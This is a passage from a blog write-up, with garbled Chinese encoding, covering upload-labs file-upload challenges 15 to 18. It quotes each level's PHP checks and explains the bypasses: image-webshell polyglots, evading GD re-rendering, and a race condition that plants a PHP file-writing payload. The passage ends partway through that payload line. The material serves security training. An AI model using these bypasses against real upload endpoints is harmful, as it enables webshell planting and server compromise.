class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">ç›¸å…³çš„å‡½æ•°è¯´æ˜ï¼š<br>getimagesize(<span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span> [,<span class="hljs-keyword">array</span> &amp;<span class="hljs-variable">$imageinfo</span>])<span class="hljs-comment">//è·å–å›¾åƒä¿¡æ¯ï¼Œè¿”å›ä¸€ä¸ªæ•°ç»„</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">è¿”å›çš„æ•°ç»„ä¸­ï¼Œç´¢å¼•0ï¼šå›¾åƒå®½åº¦åƒç´ å€¼</span><br><span class="hljs-comment"> ç´¢å¼•1ï¼šå›¾åƒé«˜åº¦åƒç´ å€¼</span><br><span class="hljs-comment"> ç´¢å¼•2ï¼šå›¾åƒç±»å‹ï¼Œ1=GIFï¼Œ2=JPGï¼Œ3=PNGï¼Œ4=SWFï¼Œ5=PSDï¼Œ6=BMPï¼Œ7=TIFF_IIï¼Œ8=TIFF_MMï¼Œ9=JPCï¼Œ10=JP2ï¼Œ11=JPXï¼Œ12=JB2ï¼Œ13=SWCï¼Œ14=IFFï¼Œ15=WBMPï¼Œ16=XBMï¼Œ17=ICOï¼Œ18=COUNT</span><br><span class="hljs-comment"> ç´¢å¼•3ï¼šå›¾åƒå®½åº¦å’Œé«˜åº¦çš„å­—ç¬¦ä¸²</span><br><span class="hljs-comment"> ç´¢å¼•bitsï¼šå›¾åƒçš„æ¯ç§é¢œè‰²çš„ä½æ•°ï¼ŒäºŒè¿›åˆ¶æ ¼å¼</span><br><span class="hljs-comment"> ç´¢å¼•channelsï¼šå›¾åƒçš„é€šé“å€¼</span><br><span class="hljs-comment"> ç´¢å¼•mimeï¼šå›¾åƒçš„MIMEä¿¡æ¯</span><br><span class="hljs-comment">*/</span><br>image_type_to_extension(<span class="hljs-keyword">int</span> <span class="hljs-variable">$imagetype</span> [,<span class="hljs-keyword">bool</span> <span class="hljs-variable">$include_dot</span> = <span class="hljs-literal">TRUE</span>])<span class="hljs-comment">//è·å–å›¾åƒç±»å‹çš„æ–‡ä»¶æ‰©å±•å</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">include_dotæ˜¯å¦åœ¨æ‰©å±•åå‰åŠ ç‚¹ã€‚é»˜è®¤ä¸ºTRUE</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="bypass-14"><a href="#bypass-14" class="headerlink" title="bypass"></a>bypass</h3><p>ç»è¿‡æµ‹è¯•ï¼Œä¹‹å‰ä½¿ç”¨çš„ä»…å«å›¾ç‰‡å¤´çš„pngå’Œgifæ–‡ä»¶éƒ½èƒ½æˆåŠŸä¸Šä¼ ï¼Œä½†jpgç±»å‹å´ä¸è¡Œï¼ˆwhyï¼Ÿï¼Ÿï¼‰</p><p>å› æ­¤æˆ‘ä»¬éœ€è¦ä¼ å…¥ä¸€ä¸ªå®Œæ•´çš„å›¾ç‰‡ä¸ğŸæ‹¼æ¥</p><p>é€‰æ‹©å›¾ç‰‡çš„æ—¶å€™è¦ç¡®ä¿ä¸å«ä¼šå¼•å‘è¯­æ³•é”™è¯¯çš„å›¾ç‰‡</p><p>æ¯”å¦‚æˆ‘é€‰æ‹©çš„ä¸€ä¸ªå›¾ç‰‡å› ä¸ºå«æœ‰ ` åå¼•å·å°±å¼•å‘äº†è¯­æ³•é”™è¯¯ï¼š</p><p><img src="https://i.loli.net/2021/02/13/ekRvSByhCEaODQj.png"></p><p>æ¢ä¸€ä¸ªå›¾ç‰‡å°±å¯ä»¥å•¦ï¼š</p><p><img src="https://i.loli.net/2021/02/13/pOd4ojxsmPbQvBN.png"></p><p>æœ€ç»ˆï¼š</p><p><img src="https://i.loli.net/2021/02/13/Z8Vs3vfjFog5xlN.png"></p><h2 id="pass16ï¼ˆå›¾ç‰‡ğŸ-exif-imagetypeï¼‰"><a href="#pass16ï¼ˆå›¾ç‰‡ğŸ-exif-imagetypeï¼‰" class="headerlink" title="pass16ï¼ˆå›¾ç‰‡ğŸ-exif_imagetypeï¼‰"></a>pass16ï¼ˆå›¾ç‰‡ğŸ-exif_imagetypeï¼‰</h2><p>éœ€è¦å¼€å¯php_exifæ¨¡å—</p><h3 id="åˆ†æ-15"><a href="#åˆ†æ-15" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-comment">//éœ€è¦å¼€å¯php_exifæ¨¡å—</span><br>    <span class="hljs-variable">$image_type</span> = exif_imagetype(<span class="hljs-variable">$filename</span>); <span class="hljs-comment">#è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åï¼Œåˆ¤æ–­ä¸€ä¸ªå›¾åƒçš„ç±»å‹</span><br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$image_type</span>) &#123;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_GIF:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;gif&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_JPEG:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;jpg&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_PNG:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;png&quot;</span>;<br>            <span class="hljs-keyword">break</span>;    <br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="bypass-15"><a href="#bypass-15" class="headerlink" title="bypass"></a>bypass</h3><p>æŒ‰é“ç†ä¸Šä¼ pass15çš„å›¾åƒèƒ½è¿‡è¿™é‡Œä¹Ÿèƒ½è¿‡ï¼Œä¸è¿‡ä¸çŸ¥ä¸ºå•¥ç‚¹å‡»ä¸Šä¼ ä¹‹åå•¥éƒ½æ²¡äº†â€“</p><p>é™¤äº†pass16å…¶ä»–çš„éƒ½æŒºæ­£å¸¸çš„</p><p><img src="https://i.loli.net/2021/02/13/KdN9o3rWCQcvDLq.png"></p><h2 id="pass17ï¼ˆå›¾ç‰‡ğŸ-é‡æ–°æ¸²æŸ“ï¼‰"><a href="#pass17ï¼ˆå›¾ç‰‡ğŸ-é‡æ–°æ¸²æŸ“ï¼‰" class="headerlink" title="pass17ï¼ˆå›¾ç‰‡ğŸ-é‡æ–°æ¸²æŸ“ï¼‰"></a>pass17ï¼ˆå›¾ç‰‡ğŸ-é‡æ–°æ¸²æŸ“ï¼‰</h2><h3 id="åˆ†æ-16"><a href="#åˆ†æ-16" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>åˆ¤æ–­åç¼€ä¸MIMEç±»å‹æ˜¯å¦ç¬¦åˆè¦æ±‚ï¼Œç¬¦åˆåç”Ÿæˆæ–°å›¾åƒï¼ˆå†…å®¹ä¸æ­£ç¡®ä¼šå¤±è´¥ï¼Œè¿”å›falseï¼Œç›¸å½“äºå¤šäº†ä¸€æ¬¡éªŒè¯ï¼‰ï¼Œç”Ÿæˆæ–°å›¾åƒå¤±è´¥å°±<code>unlink</code>åˆ é™¤ï¼ŒæˆåŠŸå°±æ ¹æ®ç³»ç»Ÿæ—¶é—´ç»™æ–‡ä»¶å‘½åï¼Œå†é€šè¿‡<code>imagejpeg</code>ç±»ä¼¼å‡½æ•°ä½¿ç”¨åŸå›¾åƒèµ„æºåˆ›å»ºæ–°å›¾åƒï¼ˆäºŒæ¬¡æ¸²æŸ“ï¼‰</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs php">è°ƒç”¨äº†phpçš„GDåº“ï¼Œæå–äº†æ–‡ä»¶ä¸­çš„å›¾ç‰‡æ•°æ®ï¼Œç„¶åå†é‡æ–°æ¸²æŸ“ï¼Œè¿™æ ·å›¾ç‰‡ä¸­æ’å…¥çš„æ¶æ„ä»£ç å°±ä¼šè¢«è¿‡æ»¤æ‰äº†<br><span class="hljs-comment">// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„</span><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$filetype</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>];<br>    <span class="hljs-variable">$tmpname</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><br>    <span class="hljs-variable">$target_path</span>=UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.basename(<span class="hljs-variable">$filename</span>);<br><br>    <span class="hljs-comment">// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å</span><br>    <span class="hljs-variable">$fileext</span>= substr(strrchr(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;.&quot;</span>),<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">//åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ</span><br>    <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/jpeg&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span><br>            <span class="hljs-variable">$im</span> = imagecreatefromjpeg(<span class="hljs-variable">$target_path</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼&quot;</span>;<br>                @unlink(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span><br>                srand(time());<br>                <span class="hljs-variable">$newfilename</span> = strval(rand()).<span class="hljs-string">&quot;.jpg&quot;</span>;<br>                <span class="hljs-comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                imagejpeg(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br>                @unlink(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;png&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/png&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span><br>            <span class="hljs-variable">$im</span> = imagecreatefrompng(<span class="hljs-variable">$target_path</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼&quot;</span>;<br>                @unlink(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                 <span class="hljs-comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span><br>                srand(time());<br>                <span class="hljs-variable">$newfilename</span> = strval(rand()).<span class="hljs-string">&quot;.png&quot;</span>;<br>                <span class="hljs-comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                imagepng(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br><br>                @unlink(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;               <br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;gif&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/gif&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span><br>            <span class="hljs-variable">$im</span> = imagecreatefromgif(<span class="hljs-variable">$target_path</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼&quot;</span>;<br>                @unlink(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span><br>                srand(time());<br>                <span class="hljs-variable">$newfilename</span> = strval(rand()).<span class="hljs-string">&quot;.gif&quot;</span>;<br>                <span class="hljs-comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                imagegif(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br><br>                @unlink(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç›¸å…³å‡½æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">basename(<span class="hljs-keyword">string</span> <span class="hljs-variable">$path</span> [,<span class="hljs-keyword">string</span> <span class="hljs-variable">$suffix</span>]) <span class="hljs-comment">//è¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†</span><br>imagecreatefromjpeg(<span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span>)<br>imagecreatefrompng(<span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span>) <br>imagecreatefromgif(<span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span>) <span class="hljs-comment">//ç”±æ–‡ä»¶æˆ–URLåˆ›å»ºä¸€ä¸ªæ–°å›¾åƒï¼Œå†…å®¹ä¸å¯¹åˆ™å¤±è´¥è¿”å›falseï¼ŒæˆåŠŸåè¿”å›å›¾åƒèµ„æº</span><br>srand([<span class="hljs-keyword">int</span> <span class="hljs-variable">$seed</span> ]) <span class="hljs-comment">//ç”¨seedæ’­ä¸‹éšæœºæ•°å‘ç”Ÿå™¨ç§å­</span><br>strval(mixed <span class="hljs-variable">$var</span>) <span class="hljs-comment">//è¿”å›å­—ç¬¦ä¸²ç±»å‹çš„var</span><br>imagejpeg(resource <span class="hljs-variable">$image</span> [,<span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span> [,<span class="hljs-keyword">int</span> <span class="hljs-variable">$quality</span>]])<span class="hljs-comment">//ä»imageå›¾åƒä»¥filenameä¸ºæ–‡ä»¶ååˆ›å»ºä¸€ä¸ªJPEGå›¾åƒ</span><br>imagepng(resource <span class="hljs-variable">$image</span> [,<span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span>]) <span class="hljs-comment">//ä» image å›¾åƒä»¥filenameä¸ºæ–‡ä»¶ååˆ›å»ºä¸€ä¸ªPNGå›¾åƒæˆ–æ–‡ä»¶</span><br>imagegif(resource <span class="hljs-variable">$image</span> [,<span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span>]) <span class="hljs-comment">//ä» image å›¾åƒä»¥filenameä¸ºæ–‡ä»¶ååˆ›å»ºä¸€ä¸ªGIFå›¾åƒæˆ–æ–‡ä»¶</span><br></code></pre></td></tr></table></figure><h3 id="bypass-16"><a href="#bypass-16" class="headerlink" title="bypass"></a>bypass</h3><p>ä½¿ç”¨å®¹æ˜“ç»•è¿‡äºŒæ¬¡æ¸²æŸ“çš„gifæ–‡ä»¶</p><p>1ã€åˆ¶ä½œgifæ ¼å¼çš„å›¾ç‰‡ğŸï¼Œä¸Šä¼ ã€‚</p><p>2ã€å°è¯•æ˜¯å¦èƒ½åˆ©ç”¨ï¼Œè‹¥ä¸èƒ½åˆ©ç”¨åˆ™å°†å…¶ä¸‹è½½ï¼Œä¸åŸğŸè¿›è¡Œæ¯”è¾ƒï¼Œå¯»æ‰¾äºŒæ¬¡æ¸²æŸ“ä¸æ”¹å˜çš„åœ°æ–¹æ’å…¥ğŸ</p><p>ï¼ˆjpgåŸç†ç±»ä¼¼ï¼Œè€Œpngå¯ä»¥å°†ğŸæ”¾åœ¨CBCæˆ–è€…IDATå—æ¥ç»•è¿‡äºŒæ¬¡æ¸²æŸ“ï¼‰</p><p><img src="https://i.loli.net/2021/02/13/JLmRVfIl4TSWvsi.png" alt="æ¸²æŸ“å"></p><p><img src="https://i.loli.net/2021/02/13/IxFM4hN5UVGiJnQ.png" alt="æ’å…¥"></p><p>æˆåŠŸåˆ©ç”¨ï¼š</p><p><img src="https://i.loli.net/2021/02/13/lT3AnLyM9vtFRH8.png" alt="æˆåŠŸè§£æ"></p><h2 id="pass18ï¼ˆç™½åå•-æ¡ä»¶ç«äº‰-æ–‡ä»¶åˆ é™¤ï¼‰"><a href="#pass18ï¼ˆç™½åå•-æ¡ä»¶ç«äº‰-æ–‡ä»¶åˆ é™¤ï¼‰" class="headerlink" title="pass18ï¼ˆç™½åå•-æ¡ä»¶ç«äº‰-æ–‡ä»¶åˆ é™¤ï¼‰"></a>pass18ï¼ˆç™½åå•-æ¡ä»¶ç«äº‰-æ–‡ä»¶åˆ é™¤ï¼‰</h2><h3 id="åˆ†æ-17"><a href="#åˆ†æ-17" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>tipsï¼š<code>åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼</code>ï¼Œéœ€è¦ä»£ç å®¡è®¡</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$file_name</span>,strrpos(<span class="hljs-variable">$file_name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<span class="hljs-comment">#è·å–æ–‡ä»¶åç¼€</span><br>    <span class="hljs-comment">#strrops,è®¡ç®—æŒ‡å®šå­—ç¬¦ä¸²åœ¨ç›®æ ‡å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œè¿™é‡Œç›®çš„æ˜¯è¿”å›&quot;.&quot;åœ¨filenameä¸­æœ€åå‡ºç°çš„ä½ç½®</span><br>    <span class="hljs-variable">$upload_file</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br><br>    <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))&#123;<span class="hljs-comment">#å°†ä¸Šä¼ çš„æ–‡ä»¶ç§»åŠ¨åˆ°æ–°ä½ç½®</span><br>        <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<span class="hljs-comment">#æ£€æŸ¥æ–‡ä»¶åç¼€ï¼Œç¬¦å·jpg|png|gifåˆ™é‡å‘½å</span><br>             <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span>. rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<span class="hljs-comment">#æ–‡ä»¶é‡å‘½å</span><br>             rename(<span class="hljs-variable">$upload_file</span>, <span class="hljs-variable">$img_path</span>); <span class="hljs-comment">#å°†upload_fileé‡å‘½åä¸ºimg_path </span><br>             <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">#ä¸ç¬¦åˆåˆ™åˆ é™¤æ–‡ä»¶</span><br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;<br>            unlink(<span class="hljs-variable">$upload_file</span>);<span class="hljs-comment">#ä¸ç¬¦åˆåˆ™ä½¿ç”¨unlinkå‡½æ•°åˆ é™¤</span><br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä¼šè¢«å­˜æ”¾åœ¨ä¸´æ—¶æ–‡ä»¶å¤¹ä¸­ï¼Œå¹¶ä¸”åç«¯å¯¹æ–‡ä»¶è¿›è¡Œåˆ¤æ–­ä¸åˆ é™¤æ—¶éœ€è¦ä¸€å®šæ—¶é—´</p><p>å°è¯•æ¡ä»¶ç«äº‰</p><p>é€šè¿‡å‘é€å¹¶å‘åŒ…ï¼ˆä¹Ÿå°±æ˜¯å‘å¾ˆå¤šä¸ªåŒ…~é‡å¤ä¸Šä¼ phpæ–‡ä»¶ï¼‰ï¼Œåˆ©ç”¨åç«¯åˆ¤æ–­ã€åˆ é™¤çš„æ—¶é—´å·®ï¼Œä¸æ–­è®¿é—®æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ï¼ˆç›®çš„æ—¶è®©ä¸­é—´ä»¶è§£æä¸Šä¼ æ–‡ä»¶ï¼‰</p><p>å› ä¸ºæˆ‘ä»¬ä¸Šä¼ çš„phpæ–‡ä»¶æœ€ç»ˆéƒ½ä¼šè¢«åˆ é™¤ï¼Œå› æ­¤æœ€ç»ˆç»•è¿‡çš„æ–¹æ³•æ˜¯ä¸Šä¼ å†…å®¹ä¸º<code>&lt;?php fputs(fopen(&#39;info.php&#39;,&#39;w&#39;),&#39;&lt;?php phpinfo(); 